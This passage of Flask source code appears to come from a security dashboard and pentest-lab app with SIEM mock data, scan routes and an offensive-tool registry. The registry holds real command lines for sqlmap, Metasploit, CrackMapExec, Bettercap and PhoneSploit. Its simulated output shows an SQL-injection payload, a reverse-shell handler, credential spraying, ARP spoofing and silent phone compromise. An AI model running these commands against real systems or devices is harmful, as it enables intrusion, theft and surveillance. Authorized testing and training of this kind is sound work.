        ("ALT-004","Pass-the-Hash Lateral Movement","CrowdStrike","High","Investigating","NTLM hash reuse svc_backup","DC-PROD-01"),
        ("ALT-005","DNS Tunneling Exfiltration","Splunk","Medium","Open","TXT queries to d4t4-ex.xyz","10.0.0.87"),
        ("ALT-006","Sudo Privilege Escalation","Sentinel","High","Open","dev_user → /bin/bash","linux-prod-07"),
    ]
    for aid, title, src, sev, stat, desc, host in alerts:
        if not SIEMAlert.query.filter_by(alert_id=aid).first():
            db.session.add(SIEMAlert(alert_id=aid, title=title, source=src, severity=sev,
                status=stat, description=desc, host=host,
                timestamp=datetime.utcnow() - timedelta(minutes=random.randint(5, 300))))

    assets = [
        ("DC-PROD-01","10.0.0.1","Windows Server 2022","Server","Critical","IT Infrastructure"),
        ("app-server-03","10.0.0.14","Ubuntu 22.04 LTS","Server","High","Engineering"),
        ("WKSTN-042","192.168.1.42","Windows 11 Pro","Workstation","Medium","Finance"),
        ("fw-edge-01","10.0.0.254","Cisco IOS XE 17.9","Network","Critical","Network Ops"),
        ("linux-prod-07","10.0.1.7","RHEL 9.2","Server","High","DevOps"),
        ("DB-CLUSTER-01","10.0.2.10","Ubuntu 20.04 LTS","Server","Critical","Data Engineering"),
    ]
    for hn, ip, os_name, tp, crit, dept in assets:
        if not Asset.query.filter_by(hostname=hn).first():
            db.session.add(Asset(hostname=hn, ip_address=ip, os_type=os_name, asset_type=tp,
                criticality=crit, department=dept,
                last_seen=datetime.utcnow() - timedelta(minutes=random.randint(1, 60))))
    db.session.commit()

# ══════════════════════════════════════════════════════════════
# 9. FORMS
# ══════════════════════════════════════════════════════════════
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    password = PasswordField('Password', validators=[DataRequired()])
    submit   = SubmitField('Login')

class ScanForm(FlaskForm):
    target = StringField('Target', validators=[DataRequired(), Length(min=3, max=100)])
    tool   = SelectField('Tool', choices=[
        ('nmap',      'Nmap — Network Port Discovery'),
        ('recon',     'Whois / DNS Recon'),
        ('nikto',     'Nikto — Web Vulnerability Scanner'),
        ('openvas',   'OpenVAS — Full Vulnerability Assessment'),
        ('shodan',    'Shodan — Infrastructure Intelligence'),
        ('harvester', 'theHarvester — Email & Subdomain OSINT'),
        ('recon_ng',  'Recon-ng — OSINT Framework'),
        ('dorks',     'Google Dorks — Search Query Generator'),
    ])
    authorized = BooleanField('I confirm I have written authorization to scan this target.',
                              validators=[DataRequired(message="Authorization required.")])
    submit = SubmitField('Launch Scan')
    def validate_target(self, field):
        try:
            SecurityUtils.validate_target(field.data)
        except ValueError as e:
            raise ValidationError(str(e))

class VulnFilterForm(FlaskForm):
    search   = StringField('Search', validators=[Optional(), Length(max=100)])
    severity = SelectField('Severity', choices=[('All','All'), ('Critical','Critical'),
                           ('High','High'), ('Medium','Medium'), ('Low','Low')])
    submit   = SubmitField('Filter')

class UserForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=3, max=50)])
    password = PasswordField('Password', validators=[DataRequired(), Length(min=8)])
    role     = SelectField('Role', choices=[('analyst','Analyst'), ('admin','Admin')])
    submit   = SubmitField('Create User')

# ══════════════════════════════════════════════════════════════
# 10. ROUTES — AUTH
# ══════════════════════════════════════════════════════════════
@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('mode_selection'))
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user and user.check_password(form.password.data) and user.is_active_user:
            login_user(user)
            return redirect(request.args.get('next') or url_for('mode_selection'))
        flash('Invalid credentials.', 'danger')
    return render_template('login.html', form=form)

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def mode_selection():
    return render_template('mode_selection.html')

@app.route('/set-mode/<mode>')
@login_required
def set_mode(mode):
    if mode in ('individual', 'organization', 'pentest'):
        current_user.mode = mode
        db.session.commit()
        session['mode'] = mode
    if mode == 'individual': return redirect(url_for('individual_dashboard'))
    if mode == 'pentest':    return redirect(url_for('pentest_dashboard'))
    return redirect(url_for('org_dashboard'))

# ══════════════════════════════════════════════════════════════
# 11. ROUTES — INDIVIDUAL
# ══════════════════════════════════════════════════════════════
@app.route('/individual')
@login_required
def individual_dashboard():
    session['mode'] = 'individual'
    logs  = AuditLog.query.filter_by(user_id=current_user.id).order_by(AuditLog.timestamp.desc()).limit(5).all()
    total = AuditLog.query.filter_by(user_id=current_user.id).count()
    return render_template('individual/dashboard.html', logs=logs, total_scans=total)

@app.route('/individual/scan', methods=['GET', 'POST'])
@login_required
def individual_scan():
    session['mode'] = 'individual'
    form   = ScanForm()
    result = None
    target_display = None
    tool_name      = None
    if form.validate_on_submit():
        target = form.target.data
        tc     = form.tool.data
        scanner_map = {
            'nmap':      NmapWrapper,
            'recon':     WhoisWrapper,
            'nikto':     NiktoWrapper,
            'openvas':   OpenVASWrapper,
            'shodan':    ShodanWrapper,
            'harvester': HarvesterWrapper,
            'recon_ng':  ReconNGWrapper,
            'dorks':     GoogleDorkWrapper,
        }
        result         = scanner_map.get(tc, WhoisWrapper)().run(target)
        target_display = target
        tool_name      = dict(form.tool.choices).get(tc, tc)
        flash(f'Scan complete: {tool_name} on {target}', 'success')
    return render_template('individual/scan.html', form=form,
                           result=result, target=target_display, tool_name=tool_name)

@app.route('/individual/chat')
@login_required
def individual_chat():
    session['mode'] = 'individual'
    msgs = ChatMessage.query.filter_by(user_id=current_user.id, mode='individual').order_by(ChatMessage.timestamp).all()
    return render_template('individual/chat.html', messages=msgs)

@app.route('/individual/history')
@login_required
def individual_history():
    session['mode'] = 'individual'
    logs = AuditLog.query.filter_by(user_id=current_user.id).order_by(AuditLog.timestamp.desc()).all()
    return render_template('individual/history.html', logs=logs)

# ══════════════════════════════════════════════════════════════
# 12. ROUTES — ORGANIZATION
# ══════════════════════════════════════════════════════════════
@app.route('/org')
@login_required
def org_dashboard():
    session['mode'] = 'organization'
    return render_template('org/dashboard.html',
        alert_count   = SIEMAlert.query.filter_by(status='Open').count(),
        critical_count= SIEMAlert.query.filter_by(severity='Critical', status='Open').count(),
        asset_count   = Asset.query.count(),
        vuln_count    = Vulnerability.query.filter(Vulnerability.cvss_score >= 7.0).count(),
        ticket_count  = ServiceNowTicket.query.count(),
        recent_alerts = SIEMAlert.query.order_by(SIEMAlert.timestamp.desc()).limit(5).all())

@app.route('/org/alerts')
@login_required
def org_alerts():
    session['mode'] = 'organization'
    src  = request.args.get('source',   'All')
    sev  = request.args.get('severity', 'All')
    stat = request.args.get('status',   'All')
    q    = SIEMAlert.query
    if src  != 'All': q = q.filter_by(source=src)
    if sev  != 'All': q = q.filter_by(severity=sev)
    if stat != 'All': q = q.filter_by(status=stat)
    return render_template('org/alerts.html',
        alerts=q.order_by(SIEMAlert.timestamp.desc()).all(),
        source=src, severity=sev, status=stat)

@app.route('/org/alerts/<int:aid>/update', methods=['POST'])
@login_required
def update_alert(aid):
    a  = SIEMAlert.query.get_or_404(aid)
    ns = request.form.get('status')
    if ns in ('Open', 'Investigating', 'Closed'):
        a.status = ns
        db.session.commit()
    return redirect(url_for('org_alerts'))

@app.route('/org/assets')
@login_required
def org_assets():
    session['mode'] = 'organization'
    return render_template('org/assets.html', assets=Asset.query.all())

@app.route('/org/vulnerabilities')
@login_required
def org_vulnerabilities():
    session['mode'] = 'organization'
    form = VulnFilterForm(request.args)
    q    = Vulnerability.query
    if form.search.data:
        q = q.filter(Vulnerability.vendor_product.ilike(f'%{form.search.data}%'))
    if form.severity.data and form.severity.data != 'All':
        q = q.filter_by(severity=form.severity.data)
    return render_template('org/vulnerabilities.html', form=form,
        vulns=q.order_by(Vulnerability.is_kev.desc(), Vulnerability.cvss_score.desc()).all())

@app.route('/org/patch')
@login_required
def org_patch():
    session['mode'] = 'organization'
    return render_template('org/patch.html',
        vulns=Vulnerability.query.order_by(
            Vulnerability.is_kev.desc(), Vulnerability.cvss_score.desc()).all())

@app.route('/org/integrations')
@login_required
def org_integrations():
    session['mode'] = 'organization'
    return render_template('org/integrations.html')

@app.route('/org/chat')
@login_required
def org_chat():
    session['mode'] = 'organization'
    msgs = ChatMessage.query.filter_by(
        user_id=current_user.id, mode='organization').order_by(ChatMessage.timestamp).all()
    return render_template('org/chat.html', messages=msgs)

# Simulated tool API endpoints
@app.route('/api/splunk/search', methods=['POST'])
@login_required
def splunk_search():
    q = request.json.get('query', '')
    return jsonify({'status':'success', 'results':SplunkService.search(q), 'query':q, 'elapsed':'0.42s'})

@app.route('/api/crowdstrike/detections')
@login_required
def cs_detections():
    return jsonify({'status':'success', 'detections':CrowdStrikeService.DETECTIONS})

@app.route('/api/tenable/scans')
@login_required
def tenable_scans():
    return jsonify({'status':'success', 'results':TenableService.SCAN_RESULTS})

@app.route('/api/sentinel/incidents')
@login_required
def sentinel_incidents():
    return jsonify({'status':'success', 'incidents':SentinelService.INCIDENTS})

@app.route('/api/qradar/offenses')
@login_required
def qradar_offenses():
    return jsonify({'status':'success', 'offenses':QRadarService.OFFENSES})

@app.route('/api/servicenow/tickets')
@login_required
def snow_tickets():
    tickets = ServiceNowTicket.query.order_by(ServiceNowTicket.created_at.desc()).all()
    return jsonify({'status':'success', 'tickets':[{
        'inc_number': t.inc_number, 'title': t.title, 'priority': t.priority,
        'status': t.status, 'source': t.source, 'assigned_to': t.assigned_to,
        'created_at': t.created_at.strftime('%Y-%m-%d %H:%M')} for t in tickets]})

@app.route('/api/servicenow/create', methods=['POST'])
@login_required
def snow_create():
    d   = request.json
    inc = f"INC{random.randint(1000000, 9999999)}"
    t   = ServiceNowTicket(
        inc_number  = inc,
        title       = d.get('title', 'New Ticket'),
        description = d.get('description', ''),
        priority    = d.get('priority', 'Medium'),
        source      = d.get('source', 'Manual'),
        status      = 'New')
    db.session.add(t)
    db.session.commit()
    return jsonify({'status':'success', 'inc_number':inc, 'ticket_id':t.id})

@app.route('/api/servicenow/update/<int:tid>', methods=['POST'])
@login_required
def snow_update(tid):
    t  = ServiceNowTicket.query.get_or_404(tid)
    ns = request.json.get('status')
    if ns in ('New', 'In Progress', 'Resolved', 'Closed'):
        t.status = ns
        db.session.commit()
    return jsonify({'status':'success'})

# ══════════════════════════════════════════════════════════════
# 13. ROUTES — PROWLER
# ══════════════════════════════════════════════════════════════
@app.route('/prowler')
@login_required
def prowler_dashboard():
    session['mode'] = 'organization'
    scans        = ProwlerScan.query.order_by(ProwlerScan.started_at.desc()).limit(10).all()
    latest       = next((s for s in scans if s.status == 'completed'), None)
    findings     = json.loads(latest.findings_json) if latest and latest.findings_json else []
    threat_score = ProwlerService.get_threat_score(findings) if findings else 0
    return render_template('prowler/dashboard.html',
        scans=scans, latest=latest, findings=findings,
        threat_score=threat_score, compliance=COMPLIANCE_FRAMEWORKS)

@app.route('/prowler/scan', methods=['POST'])
@login_required
def prowler_start_scan():
    provider = request.json.get('provider', 'aws')
    creds    = request.json.get('credentials', {})
    scan_id  = str(uuid.uuid4())[:8]
    scan     = ProwlerScan(scan_id=scan_id, provider=provider, status='running')
    db.session.add(scan)
    db.session.commit()
    t = threading.Thread(target=_run_prowler_bg,
                         args=(app._get_current_object(), scan_id, provider, creds))
    t.daemon = True
    t.start()
    return jsonify({'status':'success', 'scan_id':scan_id})

def _run_prowler_bg(app_ctx, scan_id, provider, creds):
    with app_ctx.app_context():
        ProwlerService.run_scan(scan_id, provider, creds)

@app.route('/prowler/status/<scan_id>')
@login_required
def prowler_status(scan_id):
    scan = ProwlerScan.query.filter_by(scan_id=scan_id).first_or_404()
    return jsonify({'status':scan.status, 'pass':scan.total_pass,
                    'fail':scan.total_fail, 'warn':scan.total_warn})

@app.route('/prowler/findings/<scan_id>')
@login_required
def prowler_findings(scan_id):
    scan     = ProwlerScan.query.filter_by(scan_id=scan_id).first_or_404()
    findings = json.loads(scan.findings_json) if scan.findings_json else []
    return jsonify({'status':'success', 'findings':findings,
                    'threat_score':ProwlerService.get_threat_score(findings)})

@app.route('/prowler/chat')
@login_required
def prowler_chat():
    session['mode'] = 'organization'
    msgs   = ChatMessage.query.filter_by(
        user_id=current_user.id, mode='prowler').order_by(ChatMessage.timestamp).all()
    latest = ProwlerScan.query.filter_by(status='completed').order_by(
        ProwlerScan.started_at.desc()).first()
    return render_template('prowler/chat.html', messages=msgs, latest_scan=latest)

# ══════════════════════════════════════════════════════════════
# 14. ROUTES — AI CHAT API
# ══════════════════════════════════════════════════════════════
@app.route('/api/chat', methods=['POST'])
@login_required
def api_chat():
    d      = request.get_json()
    prompt = (d.get('prompt') or '').strip()
    mode   = d.get('mode', session.get('mode', 'individual'))
    if not prompt:
        return jsonify({'status':'error', 'message':'Empty prompt'}), 400

    if mode == 'prowler':
        latest = ProwlerScan.query.filter_by(status='completed').order_by(
            ProwlerScan.started_at.desc()).first()
        if latest and latest.findings_json:
            findings = json.loads(latest.findings_json)
            fails    = [f for f in findings if f['status'] == 'FAIL'][:8]
            context  = f"Prowler scan results ({latest.provider.upper()}, {latest.total_fail} failures):\n"
            for f in fails:
                context += f"- [{f['severity'].upper()}] {f['check_id']}: {f['description']}\n"
            prompt = context + "\nUser question: " + prompt

    db.session.add(ChatMessage(user_id=current_user.id, role='user',
                               content=d.get('prompt'), mode=mode))
    db.session.commit()
    ai_text = AIService.get_response(prompt, mode)
    db.session.add(ChatMessage(user_id=current_user.id, role='ai',
                               content=ai_text, mode=mode))
    db.session.commit()
    return jsonify({'status':'success', 'data':ai_text})

# ══════════════════════════════════════════════════════════════
# 15. ROUTES — ADMIN
# ══════════════════════════════════════════════════════════════
@app.route('/admin/users')
@login_required
def admin_users():
    if current_user.role != 'admin':
        flash('Access denied.', 'danger')
        return redirect(url_for('mode_selection'))
    return render_template('admin/users.html', users=User.query.all(), form=UserForm())

@app.route('/admin/users/create', methods=['POST'])
@login_required
def admin_create_user():
    if current_user.role != 'admin':
        return redirect(url_for('mode_selection'))
    form = UserForm()
    if form.validate_on_submit():
        if User.query.filter_by(username=form.username.data).first():
            flash('Username already exists.', 'danger')
        else:
            u = User(username=form.username.data, role=form.role.data)
            u.set_password(form.password.data)
            db.session.add(u)
            db.session.commit()
            flash(f'User {form.username.data} created.', 'success')
    return redirect(url_for('admin_users'))

@app.route('/admin/users/<int:uid>/toggle', methods=['POST'])
@login_required
def admin_toggle_user(uid):
    if current_user.role != 'admin':
        return redirect(url_for('mode_selection'))
    u = User.query.get_or_404(uid)
    if u.id != current_user.id:
        u.is_active_user = not u.is_active_user
        db.session.commit()
        flash(f'User {"enabled" if u.is_active_user else "disabled"}.', 'success')
    return redirect(url_for('admin_users'))

# ══════════════════════════════════════════════════════════════
# 16. ROUTES — EXPORTS
# ══════════════════════════════════════════════════════════════
@app.route('/export/scan-history.csv')
@login_required
def export_scans():
    logs = AuditLog.query.filter_by(user_id=current_user.id).all()
    out  = io.StringIO()
    w    = csv.writer(out)
    w.writerow(['Timestamp', 'Target', 'Tool', 'Status', 'Summary'])
    for l in logs:
        w.writerow([l.timestamp.strftime('%Y-%m-%d %H:%M:%S'), l.target, l.tool_used,
                    l.status, (l.output_summary or '')[:200]])
    out.seek(0)
    return Response(out, mimetype='text/csv',
                    headers={'Content-Disposition':'attachment;filename=scan_history.csv'})

@app.route('/export/vulnerabilities.csv')
@login_required
def export_vulns():
    vulns = Vulnerability.query.order_by(Vulnerability.cvss_score.desc()).all()
    out   = io.StringIO()
    w     = csv.writer(out)
    w.writerow(['CVE ID', 'Severity', 'CVSS', 'Vendor', 'KEV', 'Description'])
    for v in vulns:
        w.writerow([v.cve_id, v.severity, v.cvss_score, v.vendor_product,
                    'Yes' if v.is_kev else 'No', v.description])
    out.seek(0)
    return Response(out, mimetype='text/csv',
                    headers={'Content-Disposition':'attachment;filename=vulnerabilities.csv'})

@app.route('/export/alerts.csv')
@login_required
def export_alerts():
    alerts = SIEMAlert.query.order_by(SIEMAlert.timestamp.desc()).all()
    out    = io.StringIO()
    w      = csv.writer(out)
    w.writerow(['Alert ID', 'Title', 'Source', 'Severity', 'Status', 'Host', 'Timestamp'])
    for a in alerts:
        w.writerow([a.alert_id, a.title, a.source, a.severity, a.status,
                    a.host, a.timestamp.strftime('%Y-%m-%d %H:%M:%S')])
    out.seek(0)
    return Response(out, mimetype='text/csv',
                    headers={'Content-Disposition':'attachment;filename=alerts.csv'})

@app.route('/export/prowler.csv')
@login_required
def export_prowler():
    latest   = ProwlerScan.query.filter_by(status='completed').order_by(
        ProwlerScan.started_at.desc()).first()
    findings = json.loads(latest.findings_json) if latest and latest.findings_json else []
    out      = io.StringIO()
    w        = csv.writer(out)
    w.writerow(['Check ID','Service','Severity','Status','Region','Resource','Description','Remediation'])
    for f in findings:
        w.writerow([f.get('check_id'), f.get('service'), f.get('severity'), f.get('status'),
                    f.get('region'), f.get('resource'), f.get('description'), f.get('remediation')])
    out.seek(0)
    return Response(out, mimetype='text/csv',
                    headers={'Content-Disposition':'attachment;filename=prowler_findings.csv'})

# ══════════════════════════════════════════════════════════════
# 17. PENTEST LAB — TOOL REGISTRY & ROUTES
# ══════════════════════════════════════════════════════════════
TOOL_REGISTRY = {
    'sqlmap': {
        'name':'SQLMap', 'category':'web', 'color':'red',
        'desc':'Automated SQL injection detection and exploitation.',
        'github':'https://github.com/sqlmapproject/sqlmap',
        'install':'pip install sqlmap',
        'cmd': lambda t, o: ['sqlmap', '-u', t, '--batch', '--level=1', '--risk=1', f'--output-dir={o}'],
        'sim': lambda t: (
            f"[SIMULATION] SQLMap v1.7.8 → {t}\n\n"
            f"[*] Testing {t} for SQL injection\n"
            f"[*] Parameter 'id' is VULNERABLE!\n"
            f"  Type: UNION-based blind\n"
            f"  Payload: id=1 UNION ALL SELECT NULL,@@version--\n\n"
            f"[DATABASE]\n  DBMS: MySQL 8.0.32  DB: webapp_prod\n"
            f"  Tables: users, sessions, orders\n\n"
            f"[EXTRACTED]\n  admin:$2y$10$AbCdEfGhIjKl...\n  john.doe:$2y$10$MnOpQrStUv...\n\n"
            f"[Fix] Parameterize all SQL queries. Use prepared statements."
        ),
    },
    'nikto': {
        'name':'Nikto', 'category':'web', 'color':'amber',
        'desc':'Web server scanner for dangerous files and misconfigs.',
        'github':'https://github.com/sullo/nikto',
        'install':'apt install nikto',
        'cmd': lambda t, o: ['nikto', '-h', t, '-output', f'{o}/nikto.txt'],
        'sim': lambda t: (
            f"[SIMULATION] Nikto v2.1.6 → {t}\n\nServer: Apache/2.4.51\n\n[FINDINGS]\n"
            f"+ /admin/: Admin interface found\n+ /robots.txt: Disallowed /backup /config\n"
            f"+ /config.php.bak: Backup exposed — CRITICAL\n+ X-Frame-Options header missing\n"
            f"+ PHP/7.4.3 outdated — multiple CVEs\n+ /phpinfo.php: PHP info exposed\n"
            f"+ Cookie PHPSESSID without HttpOnly\n\n7 findings in 28.5s"
        ),
    },
    'nuclei': {
        'name':'Nuclei', 'category':'web', 'color':'blue',
        'desc':'Fast template-based scanner by ProjectDiscovery.',
        'github':'https://github.com/projectdiscovery/nuclei',
        'install':'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
        'cmd': lambda t, o: ['nuclei', '-u', t, '-severity', 'critical,high,medium', '-o', f'{o}/nuclei.txt'],
        'sim': lambda t: (
            f"[SIMULATION] Nuclei v3.1.0 → {t}\n\n[INF] Templates: 8,432 loaded\n\n"
            f"[critical] CVE-2021-44228 Log4j JNDI RCE\n  Evidence: Callback received from canary\n\n"
            f"[high] CVE-2023-23397 Outlook NTLMv2 hash leak\n"
            f"[high] Exposed /.git/config directory\n"
            f"[medium] Missing security headers (CSP, HSTS)\n"
            f"[medium] Open redirect at /redirect?url=\n\n5 findings | 8.3s"
        ),
    },
    'owaspzap': {
        'name':'OWASP ZAP', 'category':'web', 'color':'blue',
        'desc':'OWASP Zed Attack Proxy — active/passive web app scanner.',
        'github':'https://github.com/zaproxy/zaproxy',
        'install':'pip install python-owasp-zap-v2.4',
        'cmd': lambda t, o: ['zap-cli', 'quick-scan', '--self-contained', t],
        'sim': lambda t: (
            f"[SIMULATION] OWASP ZAP 2.14.0 → {t}\n\n[INFO] Spider found 47 URLs\n"
            f"[INFO] Active scan running...\n\n"
            f"[HIGH]   SQL Injection at /search?q= (CWE-89)\n"
            f"[HIGH]   Reflected XSS at /user?name= (CWE-79)\n"
            f"[MEDIUM] CSRF missing on /api/transfer\n"
            f"[MEDIUM] Directory traversal at /files?path=\n"
            f"[LOW]    Verbose error messages\n\nOWASP Top-10: A01✗ A02✗ A03✗\nTotal: 2H 2M 1L"
        ),
    },
    'whatweb': {
        'name':'WhatWeb', 'category':'web', 'color':'cyan',
        'desc':'Web technology fingerprinting — CMS, frameworks, servers.',
        'github':'https://github.com/urbanadventurer/WhatWeb',
        'install':'apt install whatweb',
        'cmd': lambda t, o: ['whatweb', '-a', '3', t],
        'sim': lambda t: (
            f"[SIMULATION] WhatWeb v0.5.5 → {t}\n\n[TECHNOLOGIES]\n"
            f"  CMS: WordPress 6.4.2\n  Server: Apache/2.4.51\n"
            f"  PHP: 7.4.33 (EOL!)\n  jQuery: 3.6.0\n  Bootstrap: 4.6.2\n\n"
            f"[VERSION VULNS]\n  WordPress 6.4.2 — CVE-2024-0692 (CVSS 6.4)\n"
            f"  PHP 7.4 — End of Life, unpatched CVEs\n\n[Fix] Update all components immediately."
        ),
    },
    'wpscan': {
        'name':'WPScan', 'category':'web', 'color':'orange',
        'desc':'WordPress vulnerability scanner — plugins, users, themes.',
        'github':'https://github.com/wpscanteam/wpscan',
        'install':'gem install wpscan',
        'cmd': lambda t, o: ['wpscan', '--url', t, '--enumerate', 'u,p,t'],
        'sim': lambda t: (
            f"[SIMULATION] WPScan v3.8.25 → {t}\n\nWordPress: 6.4.2 (outdated)\n\n"
            f"[USERS]\n  admin (ID:1)  john.smith (ID:2)\n\n[VULNERABLE PLUGINS]\n"
            f"  WooCommerce 8.2.1 — CVE-2024-0692 SQLi (CVSS 8.8)\n"
            f"  Contact Form 7 5.8 — CVE-2023-6449 File Upload\n\n"
            f"[VULNERABLE THEMES]\n  Astra 4.2.0 — XSS (CVSS 6.1)\n\n3 vulns found | 28.5s"
        ),
    },
    'nmap_full': {
        'name':'Nmap Full Scan', 'category':'network', 'color':'green',
        'desc':'Full TCP/UDP scan with service/version and OS detection.',
        'github':'https://github.com/nmap/nmap',
        'install':'apt install nmap',
        'cmd': lambda t, o: ['nmap', '-sV', '-sC', '-O', '-p-', '--min-rate=1000', t, '-oN', f'{o}/nmap.txt'],
        'sim': lambda t: (
            f"[SIMULATION] Nmap 7.94 Full Scan → {t}\n\n"
            f"PORT      STATE  SERVICE   VERSION\n"
            f"22/tcp    open   ssh       OpenSSH 8.4p1\n"
            f"80/tcp    open   http      Apache 2.4.51\n"
            f"443/tcp   open   https     nginx 1.21.0\n"
            f"3306/tcp  open   mysql     MySQL 8.0.32\n"
            f"8080/tcp  open   http-alt  Tomcat 9.0.54\n"
            f"27017/tcp open   mongodb   MongoDB 6.0.3 (UNAUTHENTICATED!)\n\n"
            f"OS: Linux 5.x Ubuntu 22.04\n\n"
            f"[CRITICAL] MongoDB port 27017 allows unauthenticated access!\n\n"
            f"Scanned 65535 ports in 124.3s"
        ),
    },
    'metasploit': {
        'name':'Metasploit', 'category':'network', 'color':'red',
        'desc':"World's most used penetration testing framework.",
        'github':'https://github.com/rapid7/metasploit-framework',
        'install':'apt install metasploit-framework',
        'cmd': lambda t, o: ['msfconsole', '-q', '-x',
            f'use auxiliary/scanner/portscan/tcp; set RHOSTS {t}; run; exit'],
        'sim': lambda t: (
            f"[SIMULATION] Metasploit Framework v6.3.44\n\n"
            f"msf6 > use exploit/multi/handler\n"
            f"msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"
            f"msf6 > set LHOST 192.168.1.100\n\n"
            f"[*] Handler started on 192.168.1.100:4444\n"
            f"[*] Meterpreter session 1 opened from {t}!\n\n"
            f"meterpreter > sysinfo\n  Computer: WIN-TARGET01\n"
            f"  OS: Windows 10 Build 19044\n  User: CORP\\john.doe\n\n"
            f"meterpreter > getsystem\n  Got system via technique 1 (Named Pipe)\n\n"
            f"[SIMULATION — No actual session created]"
        ),
    },
    'openvas_net': {
        'name':'OpenVAS', 'category':'network', 'color':'blue',
        'desc':'Full vulnerability scanner with CVE detection.',
        'github':'https://github.com/greenbone/openvas-scanner',
        'install':'apt install openvas && gvm-setup',
        'cmd': lambda t, o: ['openvas', '-T', 'xml', '-t', t],
        'sim': lambda t: (
            f"[SIMULATION] OpenVAS/GVM 22.7 → {t}\n\nScan Policy: Full and Fast\n\n"
            f"[CRITICAL] CVE-2017-0144 EternalBlue SMBv1 (CVSS 9.8)\n"
            f"  Port: 445/tcp  Fix: Disable SMBv1, apply MS17-010\n\n"
            f"[HIGH] CVE-2021-34527 PrintNightmare (CVSS 8.8)\n"
            f"  Port: 445/tcp  Fix: Disable Print Spooler\n\n"
            f"[HIGH] OpenSSH <8.5 Priv Escalation (CVSS 7.8)\n"
            f"[MEDIUM] SSL/TLS Weak Ciphers (CVSS 5.9)\n\n"
            f"Summary: 1C 2H 1M | 187 seconds"
        ),
    },
    'bettercap': {
        'name':'Bettercap', 'category':'network', 'color':'purple',
        'desc':'WiFi, BLE, HID & network attack framework in Go.',
        'github':'https://github.com/bettercap/bettercap',
        'install':'apt install bettercap',
        'cmd': lambda t, o: ['bettercap', '-eval', 'net.probe on; net.show'],
        'sim': lambda t: (
            f"[SIMULATION] Bettercap v2.32.0\n\n[net.probe] Probing 192.168.1.0/24\n\n"
            f"[HOSTS]\n  192.168.1.1   Router (Cisco)  00:11:22:33:44:55\n"
            f"  192.168.1.10  Windows 11      AA:BB:CC:DD:EE:FF\n"
            f"  192.168.1.20  iPhone 15       11:22:33:44:55:66\n\n"
            f"[wifi.recon]\n  CorpWiFi-5G  WPA2-Enterprise  Ch.36  -62dBm  PMKID captured!\n"
            f"  Guest-Net    WPA2-Personal    Ch.1   -71dBm\n\n"
            f"[arp.spoof] Poisoning 192.168.1.10 → Gateway\n  Traffic interception active!\n\n"
            f"[SIMULATION — Authorized lab only]"
        ),
    },
    'crackmapexec': {
        'name':'CrackMapExec', 'category':'network', 'color':'amber',
        'desc':'Post-exploitation for Active Directory environments.',
        'github':'https://github.com/Porchetta-Industries/CrackMapExec',
        'install':'pip install crackmapexec',
        'cmd': lambda t, o: ['cme', 'smb', t, '--shares'],
        'sim': lambda t: (
            f"[SIMULATION] CrackMapExec v5.4.0 → {t}\n\n"
            f"SMB {t}:445  Windows 10 x64  CORP\\domain\n\n"
            f"[SHARES]\n  ADMIN$    READ WRITE\n  C$        READ WRITE\n"
            f"  SharedDocs READ  ← Sensitive files!\n\n"
            f"[CREDENTIAL SPRAY]\n  admin:Password1  → [+] SUCCESS — PWNED!\n"
            f"  admin:Welcome123 → [-] Failed\n\n[SIMULATION — Authorized AD testing only]"
        ),
    },
    'raccoon': {
        'name':'Raccoon', 'category':'osint', 'color':'orange',
        'desc':'Async recon — DNS, WHOIS, TLS, WAF, subdomain enum.',
        'github':'https://github.com/evyatarmeged/Raccoon',
        'install':'pip install raccoon-scanner',
        'cmd': lambda t, o: ['raccoon', t, '--outdir', o],
        'sim': lambda t: (
            f"[SIMULATION] Raccoon v0.9.0 → {t}\n\n"
            f"[DNS]\n  A: 93.184.216.34  MX: mail.{t}\n"
            f"  TXT: v=spf1 include:_spf.google.com ~all\n\n"
            f"[WHOIS]\n  Registrar: MarkMonitor  Created: 2010-03-15\n\n"
            f"[TLS]\n  Issuer: Let's Encrypt  Valid until: 2024-04-01\n"
            f"  SANs: {t}, www.{t}, mail.{t}\n\n"
            f"[WAF] Cloudflare detected\n\n"
            f"[SUBDOMAINS]\n  mail api dev vpn staging admin (6 found)\n\n"
            f"Results saved to /output/{t}/"
        ),
    },
    'theharvester_lab': {
        'name':'theHarvester', 'category':'osint', 'color':'cyan',
        'desc':'OSINT — emails, subdomains, IPs from public sources.',
        'github':'https://github.com/laramies/theHarvester',
        'install':'pip install theHarvester',
        'cmd': lambda t, o: ['theHarvester', '-d', t, '-b', 'google,bing', '-f', f'{o}/harvest'],
        'sim': lambda t: (
            f"[SIMULATION] theHarvester v4.4.0 → {t}\n\n"
            f"[EMAILS]\n  admin@{t}  ceo@{t}  it.support@{t}\n"
            f"  john.smith@{t}  sarah.jones@{t}\n\n"
            f"[SUBDOMAINS]\n  mail vpn dev api staging portal\n\n"
            f"[EMPLOYEES via LinkedIn]\n  John Smith — IT Admin\n"
            f"  Sarah Jones — DevOps\n  Mike Chen — Network Security\n\n"
            f"6 emails | 6 subdomains | 3 profiles"
        ),
    },
    'phonesploit': {
        'name':'PhoneSploit Pro', 'category':'osint', 'color':'green',
        'desc':'Automated Android pentest via ADB — authorized devices only.',
        'github':'https://github.com/AzeemIdrisi/PhoneSploit-Pro',
        'install':'git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro',
        'cmd': lambda t, o: ['python3', 'PhoneSploit-Pro/phonesploit.py', '--target', t],
        'sim': lambda t: (
            f"[SIMULATION] PhoneSploit-Pro → {t}:5555\n\n"
            f"[+] Device: Samsung Galaxy S23 (Android 13)\n"
            f"[+] Storage: 128GB  Battery: 87%\n\n"
            f"[*] Generating Meterpreter payload...\n"
            f"[+] APK installed silently: com.system.service\n"
            f"[+] Meterpreter session opened!\n\n"
            f"meterpreter > dump_sms → 200 messages retrieved\n"
            f"meterpreter > call_log  → 150 entries\n"
            f"meterpreter > contacts  → 312 contacts\n\n"
            f"[SIMULATION — Authorized devices only]"
        ),
    },
    'seeker': {
        'name':'Seeker', 'category':'osint', 'color':'pink',
        'desc':'Fake site captures precise GPS via browser permission.',
        'github':'https://github.com/thewhiteh4t/seeker',
